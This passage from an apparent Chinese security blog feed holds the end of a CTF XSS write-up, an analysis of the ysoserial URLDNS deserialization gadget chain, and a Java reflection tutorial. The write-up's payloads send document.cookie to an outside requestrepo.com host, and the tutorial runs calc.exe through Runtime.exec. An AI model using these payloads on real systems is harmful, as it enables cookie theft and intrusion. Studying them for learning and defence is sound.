html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>往接收的网站弹即可</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:<span class="string">&quot;x\&quot; onerror=\&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span>,<span class="string">&quot;layoutId&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe-layout"></a>safe-layout</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">aa<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css">&#123;&#123;<span class="attribute">content</span>&#125;&#125;&lt;&#123;&#123;<span class="attribute">content</span>&#125;&#125;&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">img src=&quot;<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>&quot; onerror=&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span><br></pre></td></tr></table></figure><p>实际上是这个效果:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">aa<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml">img src=&quot;<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>&quot; onerror=&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&lt;style&gt;&lt;/style&gt;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不管格式发生了什么，<br>只要有完整的img标签，就会触发请求<br>请求不到就onerror带出cookie</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—URLDNS 梦开始的地方</title>
      <link href="/2025/03/10/java-payload-URLDNS/"/>
      <url>/2025/03/10/java-payload-URLDNS/</url>
      
        <content type="html"><![CDATA[<p>看看ysoserial的payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>这条链子用于测试存不存在反序列化漏洞，<br>如果存在，那么会因为DNS被修改往某个恶意网站发送请求<br>如果接收到了请求就说明存在反序列化漏洞，可以进行后续操作</p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ul><li><h5 id="Hashmap"><a href="#Hashmap" class="headerlink" title="Hashmap"></a><code>Hashmap</code></h5></li></ul><p>类似于python的字典，用于存储键值对数据<br>看看<code>Hashmap</code>的<code>readObject</code>方法<br>如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.clamp(lf, <span class="number">0.25f</span>, <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">dc</span> <span class="operator">=</span> Math.ceil(mappings / (<span class="type">double</span>)lf);</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((dc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (dc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="type">int</span>)dc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);<span class="comment">//41行在这</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四十一行的位置触发了<code>hash()</code>函数运算<br>跟进此函数:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处是三目表达式<br>若key没有，则返回0<br>或key不为空，则调用key的hashcode方法<br>跟进:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>看来此方法跟对象有关<br>回头payload的<code>getObject</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">    ht.put(u, url);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回的是<code>hashmap</code>对象，<br>但调用的是<code>URL</code>对象的<code>hashCode</code>方法<br>跟进:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又调用的是<code>handler</code>(<code>URLStreamHandler</code>的对象) 的<code>hashCode</code>方法<br>跟进:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);<span class="comment">//！目标在这！</span></span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase(Locale.ROOT).hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到达这里:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure><p>根据主机名，获取其IP地址<br>实际上就是一次DNS查询<br>到这里就达成目的了<br>将获取到的<code>ht</code>对象(Hashmap的对象)<br>序列化:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(Utils.objectToHexString(ht));</span><br></pre></td></tr></table></figure><p>就生成了hex的序列化数据<br>如果成功的触发，那么就相当于存在反序列化漏洞</p><p>这个过程和php的链子的过程很相似<br>对于我来说有很平滑的过度<br>感谢phithon大佬</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全反射篇</title>
      <link href="/2025/03/09/java-reflect/"/>
      <url>/2025/03/09/java-reflect/</url>
      
        <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Java的反射（Reflection）是一种允许程序在运行时动态访问、检测和修改自身结构和行为的机制。</span><br><span class="line">通过反射，Java代码可以获取类的信息（如类名、方法、字段、构造器等），</span><br><span class="line">甚至操作类的私有成员、动态创建对象、调用方法等。以下是反射的核心概念和用法：</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">​为什么叫“反射”？</span><br><span class="line">“反射”这一名称来源于“程序能够像镜子一样观察自身结构”的比喻：</span><br><span class="line"></span><br><span class="line">​反射（Reflection）​​ 的字面意义是“映射、倒影”。</span><br><span class="line">在编程中，它表示程序在运行时可以“反向映射”自身的结构，</span><br><span class="line">例如类的定义、方法、属性等元数据。</span><br><span class="line">反射机制让程序不再局限于“静态”的代码结构，</span><br><span class="line">而是可以在运行时动态“反映”出类的内部细节，从而实现灵活的编程。</span><br></pre></td></tr></table></figure><h3 id="核心作用"><a href="#核心作用" class="headerlink" title="核心作用"></a>核心作用</h3><p>反射的核心作用:</p><ul><li>动态获取类的信息：在运行时分析类的结构。</li><li>动态创建对象：通过类名实例化对象。</li><li>动态调用方法：根据方法名和参数调用方法。</li><li>访问私有成员：突破访问权限限制（需主动授权）。</li><li>通用框架开发：如<code>Spring</code>、<code>Hibernate</code>等框架依赖反射实现依赖注入、动态代理等。</li></ul><h3 id="反射的核心类"><a href="#反射的核心类" class="headerlink" title="反射的核心类"></a>反射的核心类</h3><ul><li><h4 id="Class类：表示一个类或接口，是所有反射操作的入口。"><a href="#Class类：表示一个类或接口，是所有反射操作的入口。" class="headerlink" title="Class类：表示一个类或接口，是所有反射操作的入口。"></a><code>Class</code>类：表示一个类或接口，是所有反射操作的入口。</h4></li></ul><p>获取类的class对象:</p><h5 id="通过类名-class："><a href="#通过类名-class：" class="headerlink" title="通过类名.class："></a>通过类名.class：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;User&gt; clazz = User.class;</span><br></pre></td></tr></table></figure><h5 id="通过对象实例的getClass-方法："><a href="#通过对象实例的getClass-方法：" class="headerlink" title="通过对象实例的getClass()方法："></a>通过对象实例的getClass()方法：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">Class&lt;?&gt; clazz = user.getClass();</span><br></pre></td></tr></table></figure><h5 id="通过Class-forName-“全限定类名”-："><a href="#通过Class-forName-“全限定类名”-：" class="headerlink" title="通过Class.forName(“全限定类名”)："></a>通过Class.forName(“全限定类名”)：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.User&quot;</span>); <span class="comment">// 需处理ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>创建对象实例:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过无参构造器创建对象</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> clazz.newInstance(); <span class="comment">// 已过时，推荐用getDeclaredConstructor().newInstance()</span></span><br><span class="line"><span class="comment">// 通过有参构造器创建对象</span></span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) constructor.newInstance(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>);</span><br></pre></td></tr></table></figure><p>调用方法:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class); <span class="comment">// 获取公有方法</span></span><br><span class="line">method.invoke(user, <span class="string">&quot;Bob&quot;</span>); <span class="comment">// 调用方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用私有方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">privateMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;privateMethod&quot;</span>);</span><br><span class="line">privateMethod.setAccessible(<span class="literal">true</span>); <span class="comment">// 突破访问限制</span></span><br><span class="line">privateMethod.invoke(user);</span><br></pre></td></tr></table></figure><p>访问字段(属性):</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>); <span class="comment">// 访问私有字段</span></span><br><span class="line">field.set(user, <span class="string">&quot;Charlie&quot;</span>); <span class="comment">// 设置值</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) field.get(user); <span class="comment">// 获取值</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="Constructor类：表示类的构造方法，用于创建对象。"><a href="#Constructor类：表示类的构造方法，用于创建对象。" class="headerlink" title="Constructor类：表示类的构造方法，用于创建对象。"></a><code>Constructor</code>类：表示类的构造方法，用于创建对象。</h4></li></ul><p>和类名一样的函数：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;公共构造方法调用，name: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Constructor&lt;MyClass&gt; constructor = MyClass.class.getConstructor(String.class);</span><br><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;Alice&quot;</span>);</span><br></pre></td></tr></table></figure><p>常用命令执行类:<code>ProcessBuilder</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).star</span><br><span class="line"><span class="title function_">t</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(</span><br><span class="line">Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure><ul><li><h4 id="Method类：表示类的方法，用于调用方法。"><a href="#Method类：表示类的方法，用于调用方法。" class="headerlink" title="Method类：表示类的方法，用于调用方法。"></a><code>Method</code>类：表示类的方法，用于调用方法。</h4></li></ul><p>核心是<code>invoke(调用)</code>方法<br>获取 <code>Method</code> 对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">获取公共方法（包括继承的）。</span><br><span class="line">Class.getMethod(String name, Class&lt;?&gt;... parameterTypes)</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取本类中声明的方法（包括私有方法）。</span><br><span class="line">Class.getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">setAccessible ，这个是必须的。</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取 String 类的 toUpperCase 方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;toUpperCase&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建对象实例</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span 